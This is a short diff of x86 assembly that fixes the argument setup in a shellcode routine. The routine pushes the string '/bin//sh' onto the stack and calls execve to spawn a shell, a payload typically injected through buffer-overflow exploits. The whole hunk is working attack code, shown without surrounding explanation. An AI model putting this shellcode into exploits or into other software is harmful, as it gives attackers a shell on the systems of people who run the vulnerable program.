@@ -7,10 +7,13 @@
         push `//sh`
         push `/bin`
         mov ebx, esp
+        push eax
+        push ebx
+        mov ecx, esp
 
         ;; Call execve
         push eax
-        push esp
+        push ecx
         push ebx
         mov al, SYS_execve
         push eax                ; Unused
